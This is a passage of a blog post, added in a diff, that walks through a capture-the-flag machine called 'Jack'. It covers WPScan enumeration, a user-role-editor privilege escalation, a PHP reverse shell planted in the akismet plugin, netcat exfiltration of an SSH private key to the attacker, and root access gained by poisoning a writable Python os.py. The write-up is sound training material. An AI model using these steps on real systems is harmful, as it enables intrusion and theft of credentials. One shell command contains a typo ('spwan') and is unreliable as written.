+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 100%
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confidence: 60%
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | References:
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Rss Generator (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://jack.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://jack.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] WordPress theme in use: online-portfolio
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Location: http://jack.thm/wp-content/themes/online-portfolio/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Last Updated: 2024-02-05T00:00:00.000Z
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | [!] The version is out of date, the latest version is 0.1.1
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style Name: Online Portfolio
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Author: Ample Themes
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Author URI: https://amplethemes.com/
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Css Style In Homepage (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Confirmed By: Css Style In 404 Page (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Version: 0.0.7 (80% confidence)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | Found By: Style (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="s1"> |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: &#39;</span>Version: 0.0.7<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Most Popular Plugins <span class="o">(</span>via Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Checking Known Locations - Time: 00:00:13 &lt;<span class="o">=================================================================================================================================</span>&gt; <span class="o">(</span><span class="m">1499</span> / 1499<span class="o">)</span> 100.00% Time: 00:00:13
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking Plugin Versions <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> Plugin<span class="o">(</span>s<span class="o">)</span> Identified:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> akismet
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: http://jack.thm/wp-content/plugins/akismet/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2025-07-15T18:17:00.000Z
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Readme: http://jack.thm/wp-content/plugins/akismet/readme.txt
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 5.5
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://jack.thm/wp-content/plugins/akismet/, status: <span class="m">200</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Version: 3.1.7 <span class="o">(</span>100% confidence<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://jack.thm/wp-content/plugins/akismet/readme.txt
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://jack.thm/wp-content/plugins/akismet/readme.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> user-role-editor
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: http://jack.thm/wp-content/plugins/user-role-editor/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2025-04-16T12:45:00.000Z
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Readme: http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 4.64.5
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://jack.thm/wp-content/plugins/user-role-editor/, status: <span class="m">200</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Version: 4.24 <span class="o">(</span>80% confidence<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> You can get a free API token with <span class="m">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Finished: Sun Jul <span class="m">20</span> 14:53:06 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Requests Done: <span class="m">1517</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Cached Requests: <span class="m">34</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Sent: 396.645 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Received: 586.323 KB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Memory used: 239.562 MB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Elapsed time: 00:00:21
+</span></span></code></pre></div><h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>From this enumeation we can see that the <code>user-role-editor</code> plugin is installed this plugin allows you to manage and customize user roles and capabilities. On the other hand <code>askimet</code> is just a spam filtering plugin so chances for escalation are minimal. After looking online for exploits against <code>user-role-editor</code> i quickly found this one <a href="https://www.exploit-db.com/exploits/44595">https://www.exploit-db.com/exploits/44595</a> from exploit-db which works against versions less than 4.25 we are running version 4.24 so it looks like this will allow us to escalate our privileges.</p>
+<p>Reading the information available on the page it looks like if we include <code>ure_other_role=administrator</code> in a HTTP POST request to profile.php that it will give us Administrator access to wordpress. To do this i loaded up BurpSuite setup my proxy in firefox and then captured a profile update request.</p>
+<ol>
+<li>First we naviate to the profile page and scroll down to the bottom of it</li>
+<li>We then click the Update Profile button.</li>
+<li>Finally we capture the request in Burp and add the http post parameter <code>ure_other_roles=administrator</code></li>
+</ol>
+<p><img src="Pasted%20image%2020250720151105.png" alt=""></p>
+<p>We now have an admin access to the admin dashboard.</p>
+<p><img src="Pasted%20image%2020250720151439.png" alt=""></p>
+<p>From here i then used pentest monkeys php reverse shell. Specifying attacker ip and listening port.</p>
+<p><img src="Pasted%20image%2020250720151825.png" alt=""></p>
+<p>Once i had the reversehell i then did the following:</p>
+<p><img src="Pasted%20image%2020250720153130.png" alt=""></p>
+<ol>
+<li>First i navigated to the Plugin Editor where i could select the <code>askimet</code> plugin.</li>
+<li>Next i selected the <code>akismet/index.php</code> script to edit</li>
+<li>I then copied the reverseshell payload into the index.php script.</li>
+<li>Next i setup netcat to listen on port 1234 waiting to catch the reverse shell.</li>
+<li>Then i updated the plugin.</li>
+</ol>
+<p>We now need to enable this plugin by navigating to Installed Plugins and then <em>activate</em>. Now all we need to do is visit the url: <code>http://jack.thm/wp-content/plugins/akismet/index.php</code> to initiate the reverse shell connection.</p>
+<p><img src="Pasted%20image%2020250720153333.png" alt=""></p>
+<ol>
+<li>Visiting the url <code>http://jack.thm/wp-content/plugins/akismet/index.php</code></li>
+<li>Now we have caught the reverse shell and can begin stabilising it.</li>
+</ol>
+<p>Below is what i did to stabalise the shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python -c <span class="s2">&#34;import pty; pty.spwan(&#39;/bin/sh&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">bash
+</span></span><span class="line"><span class="cl">CTRL + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">stty cols &lt;cols&gt; rows &lt;rows&gt;
+</span></span></code></pre></div><h2 id="privilege-escalation-to-jack">Privilege Escalation To Jack<a href="#privilege-escalation-to-jack" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Upon gaining access to the server we can see Jacks permissions allow us to view his flag as well as a reminader that is also in his home directory. This reminder says to be carefull with backup permissions now that we know this lets see if we can find his backup. Visiting the <code>/var/backups</code> we see the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@jack:/var/backups$ ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">768</span>
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root    <span class="m">40960</span> Jan  <span class="m">9</span>  <span class="m">2020</span> alternatives.tar
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root     <span class="m">9931</span> Jan  <span class="m">9</span>  <span class="m">2020</span> apt.extended_states
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root      <span class="m">713</span> Jan  <span class="m">8</span>  <span class="m">2020</span> apt.extended_states.gz
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root       <span class="m">11</span> Jan  <span class="m">8</span>  <span class="m">2020</span> dpkg.arch
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root       <span class="m">43</span> Jan  <span class="m">8</span>  <span class="m">2020</span> dpkg.arch.gz
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root      <span class="m">437</span> Jan  <span class="m">8</span>  <span class="m">2020</span> dpkg.diversions
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root      <span class="m">202</span> Jan  <span class="m">8</span>  <span class="m">2020</span> dpkg.diversions.gz
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root      <span class="m">207</span> Jan  <span class="m">9</span>  <span class="m">2020</span> dpkg.statoverride
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root      <span class="m">129</span> Jan  <span class="m">8</span>  <span class="m">2020</span> dpkg.statoverride.gz
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">552673</span> Jan  <span class="m">9</span>  <span class="m">2020</span> dpkg.status
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">129487</span> Jan  <span class="m">8</span>  <span class="m">2020</span> dpkg.status.gz
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root      <span class="m">802</span> Jan  <span class="m">9</span>  <span class="m">2020</span> group.bak
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root shadow    <span class="m">672</span> Jan  <span class="m">9</span>  <span class="m">2020</span> gshadow.bak
+</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> root root     <span class="m">1675</span> Jan <span class="m">10</span>  <span class="m">2020</span> id_rsa
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root     <span class="m">1626</span> Jan  <span class="m">9</span>  <span class="m">2020</span> passwd.bak
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root shadow    <span class="m">969</span> Jan  <span class="m">9</span>  <span class="m">2020</span> shadow.bak
+</span></span></code></pre></div><p>As you can see the permissions on <code>id_rsa</code> are way to relaxed allowing anyone to modify write and execute it so lets copy this to our attacking machien to gain a more stable and also higher privileged shell. To copy it to my attacker i used <code>netcat</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># ATTACKER</span>
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">1234</span> &gt; id_rsa
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># TARGET</span>
+</span></span><span class="line"><span class="cl">nc &lt;attacker-ip&gt; &lt;port&gt; &lt; id_rsa
+</span></span></code></pre></div><p>Next i then set the permissions of the key to 600 to allow it to be used with ssh and then sshd into the server using the below command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@ip-10-10-118-239:~# ssh -i id_rsa jack@10.10.76.232
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.76.232 (10.10.76.232)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:XHIKDyb3qNidQr+zb33NCN5pJWW5MbreSiKgw4iyL38.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.76.232<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.6 LTS <span class="o">(</span>GNU/Linux 4.4.0-142-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">143</span> packages can be updated.
+</span></span><span class="line"><span class="cl"><span class="m">92</span> updates are security updates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Nov <span class="m">16</span> 14:27:49 <span class="m">2020</span> from 10.11.12.223
+</span></span><span class="line"><span class="cl">jack@jack:~$ 
+</span></span></code></pre></div><h2 id="privilege-escalation-to-root">Privilege Escalation to Root<a href="#privilege-escalation-to-root" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Now that i have access to jack i began seeing how i could escalate my prriviledges to gain root access. While enumerating the system i found a process with <code>pspy</code> (i downloaded onto attacking machine andthen to the target machine using python http server) that was running as root below is that process.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">2025/07/20 09:57:40 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">1</span>      <span class="p">|</span> /sbin/init 
+</span></span><span class="line"><span class="cl">2025/07/20 09:58:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">2190</span>   <span class="p">|</span> /usr/bin/python /opt/statuscheck/checker.py 
+</span></span><span class="line"><span class="cl">2025/07/20 09:58:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">2189</span>   <span class="p">|</span> /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
+</span></span><span class="line"><span class="cl">2025/07/20 09:58:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">2188</span>   <span class="p">|</span> /usr/sbin/CRON -f 
+</span></span><span class="line"><span class="cl">2025/07/20 09:58:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">2191</span>   <span class="p">|</span> /usr/bin/python /opt/statuscheck/checker.py 
+</span></span><span class="line"><span class="cl">2025/07/20 09:58:01 CMD: <span class="nv">UID</span><span class="o">=</span><span class="m">0</span>     <span class="nv">PID</span><span class="o">=</span><span class="m">2192</span>   <span class="p">|</span> sh -c /usr/bin/curl -s -I http://127.0.0.1 &gt;&gt; /opt/statuscheck/output.log 
+</span></span></code></pre></div><p>As we can see they are running <code>/opt/statuscheck/checker.py</code> as root with <code>/usr/bin/python</code> interpreter. This is using python 2.7.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jack@jack:/tmp$ <span class="nb">cd</span> /opt/statuscheck/
+</span></span><span class="line"><span class="cl">jack@jack:/opt/statuscheck$ ll
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root  <span class="m">4096</span> Jan <span class="m">10</span>  <span class="m">2020</span> ./
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root  <span class="m">4096</span> Jan <span class="m">10</span>  <span class="m">2020</span> ../
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root    <span class="m">92</span> Jan <span class="m">10</span>  <span class="m">2020</span> checker.py
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">15246</span> Jul <span class="m">20</span> 09:58 output.log
+</span></span></code></pre></div><p>Looking at this file we can see that the permissions are set correctly and that we will not be able to modify it to execute arbitrary code. However upon looking in the file we see that it is using the python <code>os</code> module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jack@jack:/opt/statuscheck$ cat checker.py 
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">os.system<span class="o">(</span><span class="s2">&#34;/usr/bin/curl -s -I http://127.0.0.1 &gt;&gt; /opt/statuscheck/output.log&#34;</span><span class="o">)</span>
+</span></span></code></pre></div><p>Running the below find command we can see the permissions set on this module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jack@jack:/opt/statuscheck$ find / -type f -name os.py -ls 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">   <span class="m">262433</span>     <span class="m">40</span> -rw-r--r--   <span class="m">1</span> root     root        <span class="m">36970</span> Nov <span class="m">12</span>  <span class="m">2018</span> /usr/lib/python3.5/os.py
+</span></span><span class="line"><span class="cl">   <span class="m">276548</span>     <span class="m">28</span> -rw-rw-r-x   <span class="m">1</span> root     family      <span class="m">25908</span> Nov <span class="m">16</span>  <span class="m">2020</span> /usr/lib/python2.7/os.py
+</span></span><span class="line"><span class="cl">jack@jack:/opt/statuscheck$
+</span></span></code></pre></div><p>One thing that stands out here is that the family group has read and write permissions on the file. However we are actually in the family group so all we need to do now is modify the module to execute some arbitrary root code to give us further access.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jack@jack:/opt/statuscheck$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jack<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jack<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>jack<span class="o">)(</span>adm<span class="o">)(</span>cdrom<span class="o">)(</span>dip<span class="o">)(</span>plugdev<span class="o">)(</span>lpadmin<span class="o">)(</span>sambashare<span class="o">)(</span>family<span class="o">)</span>
+</span></span></code></pre></div><p>I added the following code to the bottom of <code>/usr/lib/python2.7/os.py</code>. As it is being run using python 2.7.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cp /bin/bash /tmp/rootbash&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;chmod u+s /tmp/rootbash&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Now all we need to do is wait for the process to run again and we should have our suid bash shell owned by root that we can exexute with <code>-p</code> to get a root shell and thus the root flag.</p>
+<p><img src="Pasted%20image%2020250720160752.png" alt=""></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/2025-07-07-game-zone/" class="button inline prev">
+        &lt; [<span class="button__text">Game Zone</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/2025-07-13-mkingdom/" class="button inline next">
+         [<span class="button__text">mKingdom</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
